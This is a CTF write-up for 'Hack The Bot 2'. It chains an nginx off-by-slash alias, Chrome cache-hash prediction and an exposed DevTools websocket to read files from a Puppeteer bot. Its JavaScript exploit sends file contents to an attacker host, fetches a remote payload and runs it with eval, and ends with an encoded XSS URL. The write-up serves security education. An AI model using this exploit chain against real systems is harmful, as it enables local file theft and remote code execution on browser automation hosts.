# Solution pour le challenge Hack The Bot 2

## 🔎 - Recon 

To begin with, we'll need to look on the **pupeteer** code.

```js
const logPath = '/tmp/bot_folder/logs/';
const browserCachePath = '/tmp/bot_folder/browser_cache/';

[...]

async function startBot(url, name) {
    const logFilePath = path.join(logPath, `${name}.log`);

    try {
        const logStream = fs.createWriteStream(logFilePath, { flags: 'a' });
        logStream.write(`${new Date()} : Attempting to open website ${url}\n`);

        const browser = await puppeteer.launch({
            headless: 'new',
            args: ['--remote-allow-origins=*','--no-sandbox', '--disable-dev-shm-usage', `--user-data-dir=${browserCachePath}`]
        });

        const page = await browser.newPage();
        await page.goto(url);

        if (url.startsWith("http://localhost/")) {
            await page.setCookie(cookie);
        }

        logStream.write(`${new Date()} : Successfully opened ${url}\n`);
        
        await sleep(7000);
        await browser.close();

        logStream.write(`${new Date()} : Finished execution\n`);
        logStream.end();
    } catch (e) {
        const logStream = fs.createWriteStream(logFilePath, { flags: 'a' });
        logStream.write(`${new Date()} : Exception occurred: ${e}\n`);
        logStream.end();
    }
}

[...]

app.post('/report', (req, res) => {
    const url = req.body.url;
    const name = format(new Date(), "yyMMdd_HHmmss");
    startBot(url, name);
    res.status(200).send(`logs/${name}.log`);
});
``` 

We have several interesting features: 

- The user can access a pseudo webdriver log to obtain the status of his link report in `/logs/xxxx.log`
- The chrome cache folder location has been modified by `--user-data-dir`
- Webdrivers sockets are accesible from anywhere `--remote-allow-origins=*` (**We'll come back to this later**)


And the last thing is the **nginx** configuration
```nginx
events{}
user root;

http {
    server {
        listen 80;

        location / {
            proxy_pass http://localhost:5000;
        }
        
        location /logs {
            autoindex off;
            alias /tmp/bot_folder/logs/;
        }
    }
}
```

Same here, several interesting things :
- nginx is started with `root` user
- There is an alias to from `/logs` to `/tmp/bot_folder/logs/`

For the rest of the writeup we will need to understand two notions

---
## 🤖 - WebDrivers


More commonly known as `bot`, webdrivers are used to simulates user actions, navigates through web pages, interacts with elements, submit forms and many more through an **API**


In our case, the webdriver is used for exemple, here :  `await page.setCookie(cookie)`.

![](puppetter.png)

To understand, if we sniff the network during this cookie set, we can see that the webdrivers communicate with an api through a web socket, and send some order, we can follow the stream and find the way webdrivers interact with the browser.

![](websocket.png)

There is the payload :
```json
{
    "id":20,"method":"Network.setCookie", "params":
    {
    "domain":"","httpOnly":false,
    "name":"Flag",
    "path":"/",
    "sameSite":"Strict",
    "secure":false,
    "url":"http://localhost/",
    "value":"PWNME{D1d_y0U_S4iD-F1lt33Rs?}"
    },
    "sessionId":"754DFF61AC6B748D94C815363F480CF9"
} 
```

This method is actually a use of **Chrome's DevTools** layer.

---
## ⚙️ - DevTools


[Chrome DevTools Protocole](https://developer.chrome.com/docs/devtools) or CDP is a set of tools used to interact & debug remotely with browser. It can be used from the [driver directly](https://pptr.dev/api/puppeteer.cdpsession) or directly via pupeteer functions.

**How devtools work?**

CDP takes the form of an **HTTP service**, launched on localhost when the pupeteer browser is started. You can specify the port via `--remote-debugging-port=xx` or set it to 0 (or don't set it) then the port is randomized between `30000 and 50000`.

With devtools, each opened tab will have an **associated websocket**, allowing interaction and modification through it. We have already seen an example of this in the wireshark

So the [devtools API](https://chromedevtools.github.io/devtools-protocol/) has some functionalities:

- **/json/version** : Browser version metadata
- **/json/list** : A list of all available websocket targets.
- **/json/new?{url}**: Opens a new tab. Responds with his websocket data. Put method is needed since 2022
- **...**

There is a sample of the /json/list endpoint :

```json
[ {
  "description": "",
  "devtoolsFrontendUrl": "/devtools/inspector.html?ws=localhost:9222/devtools/page/DAB7FB6187B554E10B0BD18821265734",
  "id": "DAB7FB6187B554E10B0BD18821265734",
  "title": "Yahoo",
  "type": "page",
  "url": "https://www.yahoo.com/",
  "webSocketDebuggerUrl": "ws://localhost:9222/devtools/page/DAB7FB6187B554E10B0BD18821265734"
} ]
```

From here we can interact with the page in choice with the `ws://` or with `http://localhost:9222/devtools/inspector.html?ws=` endpoint; btw the **id** is random and unguessable.

It's important to note that access to the socket is subject to a **strict SOP**, theoretically allowing access only to the webdriver itself.

However, we had already noted the presence of the `--remote-allow-origins=*` argument allows anyone to access the socket, on condition that they know its **URL**, but it will fail with the http protocol, because the **remote-allow-origins** does not apply like **CORS**, but only at websocket access level (sources [here](https://source.chromium.org/chromium/chromium/src/+/main:content/browser/devtools/devtools_http_handler.cc;l=754;bpv=1;bpt=0))

So here we have a **potential gadget** enabling us to interact with websockets and exploit them to **pivot on the local file system**, which we'll detail later. But actually, we can't use devtools itself, as it's **protected by the SOP**, and so we can't retrieve websocket URLs.

We'll just have to keep finding more gadgets!

---
## ⏪ - Nginx missconfigurations

```nginx
location /logs {
    autoindex off;
    alias /tmp/bot_folder/logs/;
}
```           
There's an obvious [off-by-slash](https://medium.com/@_sharathc/unveiling-the-off-by-one-slash-vulnerability-in-nginx-configurations-c05b3b7b7c1e) vulnerability here, allowing you to move up one level in the `/tmp/bot_folder/logs/` directory. So, using it, we can go back to the bot_folder containing log files and the **`browser cache`** defined in selenium via `--user-data-dir`. We can't index the folder because of `autoindex off` so we will need exact name of the files we want. In addition, nginx runs as root, giving us permissions to read any file accessible via the off by slash.

For your information, here are the permissions for the chrome cache files 
- cache folder is `drwxr-xr-x`
- all files on it are `drwx------`

**Except** these files who are `-rw-r--r--` :
- Variations (Some crash info)
- Last Version (Chrome version)
- DevToolsActivePort (Contains the DevToolsPort)
- chrome_debug.log (Some debug, can be useful to spy other user btw :3)

---
## 🗂️ Chrome Cache

{{< lead >}}
So we can access the entire chrome cache from the alias, but what exactly are we looking for?
{{< /lead >}}

In fact, Chrome's cache is used to store a whole range of static data, such as tokens, pages, extensions, your preferences etc... So that you can find your session again from one start-up to the next, or to save you time when browsing.

What we're interested in here is the disk cache. The concept is simple: it saves your resources (html, js, wasm...) locally on your disk and, when they are accessed, makes a request to the corresponding server to ask if it is still valid, in which case the server returns the famous `304 Not modified`, then the resource is loaded locally

Resources are generally stored here: 
- `browser_cache/Default/Cache/Cache_Data/` 

Each ressource is identified by a unique hash which is **not intended to be cryptographically secure**, but used in **hash mapping**

There is a exemple :
```
-rw------- 1 tog tog 20411 Apr 30 d2df8a9596b1309c_0 < HTML cached page
-rw------- 1 tog tog  8177 Apr 30 e85ac8952d7783d7_0 < HTML cached page
-rw------- 1 tog tog    24 Apr 30 index
drwx------ 2 tog tog  4096 Apr 30 index-dir < used to keep a tracking 
```

These cache file contains all informations needed :

- Headers with **the cache key**, used for identify from where the ressource comes and the is lenght
- The ressource itself (html, js ...)
- Copy of the server response, with Headers and cache controls values (`Etag` & `Last-Modified`)
- The footer, containing **certicat** if used, and some CRC

![](xxd_cache.png)

Note that the headers specified for cache management **depend on the technology** used. In the example above, with Apache, the Etag is calculated in a certain way, whereas with **Werkzeug**, for example, **no cache headers are specified**, so the server will never return a `304`.

![](werkzeug.png)

{{< lead >}}
So why Chrome cache a page if the server will always resend the ressource ?
{{< /lead >}}

In fact, caching isn't just used to relieve server distribution & client-side page load times. Some features allow you to **use the cache WITHOUT sending a request** to the server. This is the case when Chrome asks you if you want to reopen tabs closed since the last session, or in some cases when you use `history.back()`

If you to play with cache on chrome you can use network tabs, you can disable cache, and see 304 & 200 responses

![](playing_cache.png)

Finally, certains ressources are load from `memory cache`, which is a **stack cache**, and out of this writeup.

---
## 🧮 Read cache from Nginx

We therefore have access to all chrome cache files, but due to the **alias off**, if we want to read the contents of the cached resources we'll first have to **predict files names**. The first thing to notice is that **a same resource is always cached with a similar hash**, and is consequently not random...

One possible method of **predicting the hash** could be to open the resource locally and compute a hash mapping from the FS, OR we can parse the file in the index-dir directory, who's contains the wanted information, but we can do much more elegantly :3.

Let's check how the hash is compute in chromium

If we start from [this code](https://source.chromium.org/chromium/chromium/src/+/main:net/disk_cache/simple/simple_util.cc;l=54) we can see that it compute sha1 from url and take only the first 8 bytes and convert it to hexa.

If we dig calls to this function, we can recover the generation of the url, that is not just a classic URL. And we already see a exemple of this "URL" previously in the cache file headers that is used to compute hash, there is a sample :

```
1/0/_dk_http://localhost http://localhost http://localhost:5000/
```

so it take `1/0/_dk_domain + domain + url` to generate hash, take 8 first bytes from sha1 convert it to hexa and then reverse it, there is a python code to do it

```python
import hashlib
import string
import itertools
from bitstring import BitArray

def get_entry_hash_key(url):
    sha1_hash = hashlib.sha1(url.encode()).digest()
    sha1_hash = sha1_hash[:8][::-1].hex()
    return sha1_hash

base_url = "http://localhost"
url = f"1/0/_dk_{base_url} {base_url} {base_url}:5000/"
print(get_entry_hash_key(url) + "_0")
```
`b8fd63df347dda33_0`

We can check if work by opening `http://localhost:5000/` and we see that the good filename **is create on our cache** :)

So from here with our `off-by-slash` gadget, we can read all tabs opened from his URL ! 

For exemple here, we reach the ressource:
```js
fetch('http://localhost/logs../browser_cache/Default/Cache/Cache_Data/b8fd63df347dda33_0').then(response => response.text().then(htmlContent => {console.log(htmlContent)}))
```
And boom ! We have a pseudo SOP bypass :)
![](SOP.png)

---
## ⛓️ - Chaining all together

What's next? We have an **XSS gadget**, we can interact with the **devtools websocket**, and **read the contents of the cache**.

We mentioned earlier that if we could access the websockets urls, **we could LFI the server**. So here we go !

With the websocket, **we can redirect the page and XSS on anythings**, like the `file:///` protocol, because websocket is kept open through the devtools ! 

We can do that with something like this :

```js
ws.send(JSON.stringify({ id: 0, method: 'Page.navigate', params: { url: 'file:///root/' } }));
ws.send(JSON.stringify({ id: 1, method: 'Runtime.evaluate', params: { expression: 'alert(document.body.innerHTML)' } }));
``` 


{{< alert icon="fire" cardColor="#7d571e">}}
From now, everything is through the XSS gadget !
{{< /alert >}}

1) **Open a base tab, don't care about is content**

This will be our websocket target 

```js
const targetPageUrl = 'https://secu.fun/exploit';

window.open(targetPageUrl, '_blank'); // This will be our exploit page, must not be empty
```

2) **We will need to leak the devtools port**

One of the best-known methods for that is to **scan all possible ports** from the browser, but it can take a long time and we can simply read the file `DevToolsActivePort` from the Nginx.

```js
fetch('http://localhost/logs../browser_cache/DevToolsActivePort') // Leak the port, no SOP here
    .then(response => response.text())
    .then(text => {
        const lines = text.split('\n');
        if (lines.length > 0) {
            const port = lines[0].trim();
```

3) **Then open a `/json/list` tab**

This tab will contains all the websockets URL, including our **base tab**

```js
const base_url = "http://localhost";
const WS_urls = `${base_url}:${port}/json/list`

window.open(WS_urls); // we cache the page of the /json/list, SOP here because of different port than the XSS
```

4) **Compute the hash key from cache key**

We've the url and the algo, let's compute it !

```js
const cache_key = `1/0/_dk_${base_url} ${base_url} ${base_url}:${port}/json/list`; // we create the hash_key from the URL

// Uint8Array
const encoder = new TextEncoder();
const data = encoder.encode(cache_key);

//SHA1 the cache_key
const hashBuffer = await crypto.subtle.digest('SHA-1', data);
const hashArray = Array.from(new Uint8Array(hashBuffer));

// Take only 8 first bytes and reverse them
const truncatedReversedHash = hashArray.slice(0, 8).reverse();

// Finally hex them
const hashHex = truncatedReversedHash.map(b => b.toString(16).padStart(2, '0')).join('');
const hash = hashHex + '_0'; // Depend of data type, for a classic HTML is generally _0
```

5) **Recover the /json/list cached file**

```js    
const cacheUrl = `http://localhost/logs../browser_cache/Default/Cache/Cache_Data/${hash}`;
    fetch(cacheUrl)
        .then(response => response.text())
        .then(htmlContent => {[...]});
```

6) **Extract the websocket URL**

The HTML content is a **raw file**, we will need to regex on it to recover the good `ws://` 

```js
// Attempt to extract WS link of our base tab
const regex = /"url"\s*:\s*"([^"]+)"\s*,\s*"webSocketDebuggerUrl"\s*:\s*"([^"]+)"/g;
let match;
while ((match = regex.exec(rawContent)) !== null) {
    const url = match[1];
    const webSocketUrl = match[2];
    if (url === targetPageUrl) {
        [...];
    }
}
```

7) **Finally start the websocket**

```js
// Create a websocket in our site and exploit it to access file:// and then access to the FS ! 
const ws = new WebSocket(targetWebSocketUrl);

ws.onopen = function(event) {
    console.log('WebSocket connection established.');
    ws.send(JSON.stringify({ id: 0, method: 'Page.navigate', params: { url: 'file:///root/' } })); //Load file or folder
    ws.send(JSON.stringify({ id: 1, method: 'Runtime.evaluate', params: { expression: 'fetch(`http://secu.fun:8080/?c=${btoa(encodeURIComponent(document.body.innerHTML))}`)' } }))
};
```


8) **Put it all together**

I add some **obligatory** `timeout` and some debug to the exfiltration site, with this we just pass the 7-second time sleep of the bot !

```js
function fetchAndUsePort() {
    fetch('http://localhost/logs../browser_cache/DevToolsActivePort') // Leak the port, no SOP here
        .then(response => response.text())
        .then(text => {
            const lines = text.split('\n');
            if (lines.length > 0) {
                const port = lines[0].trim();
                const base_url = "http://localhost";
                const WS_urls = `${base_url}:${port}/json/list`

                window.open(WS_urls); // we cache the page of the /json/list, SOP here because of different port
                
                const suffixed_url = `1/0/_dk_${base_url} ${base_url} ${base_url}:${port}/json/list`; // we create the cache_key from the URL
                return getEntryHashKey(suffixed_url);
            } else {
                throw new Error('No port found in the response, maybe clear the cache?');
            }
        })
        .then(hash => {
            console.log("Current hash:", hash);
            fetch(`http://secu.fun:8080/?c=step1:${hash}`)
            setTimeout(() => { 
                    fetchHtmlContentFromCache(hash, targetPageUrl); // Load our exploit page in /json/list ( don't care about cache here ), devtool will create a ws to interact with this
            }, 1500);
            
        })
        .catch(error => console.error('Error during requests or hashing:', error));
}

async function getEntryHashKey(url) {
    // https://source.chromium.org/chromium/chromium/src/+/main:net/disk_cache/simple/simple_entry_format.h
    // We use this algo to regenerate hash_key from url

    // Uint8Array
    const encoder = new TextEncoder();
    const data = encoder.encode(url);

    //SHA1 the cache_key
    const hashBuffer = await crypto.subtle.digest('SHA-1', data);
    const hashArray = Array.from(new Uint8Array(hashBuffer));

    // Take only 8 first bytes and reverse them
    const truncatedReversedHash = hashArray.slice(0, 8).reverse();

    // Finally hex them
    const hashHex = truncatedReversedHash.map(b => b.toString(16).padStart(2, '0')).join('');
    const hash = hashHex + '_0'; // Depend of data type, for a classic HTML is generally _0
    return hash;
}


function fetchHtmlContentFromCache(hash, targetUrl) {
    // Now we have the name of the file corresponding to the ressource cached, we can dump it, leaking the ws url of the /json/list cached file
    const cacheUrl = `http://localhost/logs../browser_cache/Default/Cache/Cache_Data/${hash}`;
    fetch(cacheUrl)
        .then(response => response.text())
        .then(htmlContent => {
            //console.log('HTML content:', htmlContent.lenght); // raw format
            fetch(`http://secu.fun:8080/?c=step2:${targetUrl}`)
            return extractWebSocketUrls(htmlContent, targetUrl);
        })
        .then(targetWebSocketUrl => {
            console.log('Extracted WebSocket URL for target:', targetWebSocketUrl);
        })
        .catch(error => console.error('Error fetching HTML content:', error));
}


function extractWebSocketUrls(rawContent, targetUrl) {
    
    // Attempt to extract WS link of our exploit URL
    const regex = /"url"\s*:\s*"([^"]+)"\s*,\s*"webSocketDebuggerUrl"\s*:\s*"([^"]+)"/g;
    let match;
    while ((match = regex.exec(rawContent)) !== null) {
        const url = match[1];
        const webSocketUrl = match[2];
        if (url === targetUrl) {
            setTimeout(() => {
              fetch(`http://secu.fun:8080/?c=step3`)
            }, 1000)
            return LFIfromWS(webSocketUrl);
        }
    }
    return null;
}


function LFIfromWS(targetWebSocketUrl) {
    // Create a websocket in our site and exploit it to access file:// and then leak the FS ! 
    const ws = new WebSocket(targetWebSocketUrl);
    fetch(`http://secu.fun:8080/?c=websocket+actived`)
    ws.onopen = function(event) {
        console.log('WebSocket connection established.');
        ws.send(JSON.stringify({ id: 0, method: 'Page.navigate', params: { url: 'file:///root/flag2.txt' } })); //Load file or folder
        setTimeout(() => {ws.send(JSON.stringify({ id: 1, method: 'Runtime.evaluate', params: { expression: 'fetch(`http://secu.fun:8080/?c=${btoa(encodeURIComponent(document.body.innerHTML))}`)' } }))}, 2000);
    };
}

const targetPageUrl = 'https://secu.fun/exploit';

window.open(targetPageUrl, '_blank'); // This will be our exploit page, must not be empty

setTimeout(() => { // During Chrome restart, devtool port will change and can be long
    fetchAndUsePort();
}, 2000);
```

---
## 👑 - Final payload

No way we can pass all this javascript into the `?q=` argument (more than **98000** caracters when encoded). I opted for a rather disgusting solution, but functional and practical.

Setup a flask server without CORS and share the js exploit :

```python
from flask import Flask, send_from_directory, make_response
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

@app.route('/payload')
def serve_js():
    response = make_response(send_from_directory('static', 'exploit.js'))
    return response

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
```

Make javascript to get & execute the payload :
```js
fetch("http://secu.fun:5000/payload").then((response) => response.text()).then((text) => eval(text))
```

Pass it to the `srcdoc iframe` and apply the both encoding like on the challenge part 1, finally we have our last payload !!

```url
http://localhost/?q=%3Ciframe%20srcdoc%3D%22%26lt%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26gt%3B%26%23102%3B%26%23101%3B%26%23116%3B%26%2399%3B%26%23104%3B%26lpar%3B%26quot%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26colon%3B%26sol%3B%26sol%3B%26%23115%3B%26%23101%3B%26%2399%3B%26%23117%3B%26period%3B%26%23102%3B%26%23117%3B%26%23110%3B%26colon%3B%26%2353%3B%26%2348%3B%26%2348%3B%26%2348%3B%26sol%3B%26%23112%3B%26%2397%3B%26%23121%3B%26%23108%3B%26%23111%3B%26%2397%3B%26%23100%3B%26quot%3B%26rpar%3B%26period%3B%26%23116%3B%26%23104%3B%26%23101%3B%26%23110%3B%26lpar%3B%26lpar%3B%26%23114%3B%26%23101%3B%26%23115%3B%26%23112%3B%26%23111%3B%26%23110%3B%26%23115%3B%26%23101%3B%26rpar%3B%26%2332%3B%26equals%3B%26gt%3B%26%2332%3B%26%23114%3B%26%23101%3B%26%23115%3B%26%23112%3B%26%23111%3B%26%23110%3B%26%23115%3B%26%23101%3B%26period%3B%26%23116%3B%26%23101%3B%26%23120%3B%26%23116%3B%26lpar%3B%26rpar%3B%26rpar%3B%26period%3B%26%23116%3B%26%23104%3B%26%23101%3B%26%23110%3B%26lpar%3B%26lpar%3B%26%23116%3B%26%23101%3B%26%23120%3B%26%23116%3B%26rpar%3B%26%2332%3B%26equals%3B%26gt%3B%26%2332%3B%26%23101%3B%26%23118%3B%26%2397%3B%26%23108%3B%26lpar%3B%26%23116%3B%26%23101%3B%26%23120%3B%26%23116%3B%26rpar%3B%26rpar%3B%26lt%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26gt%3B%22
```

![](flag.png)

Flag 2 : `PWNME{Th3re_ls_Mu1T1pL3_US4g3_Of_C4CH3:333}`
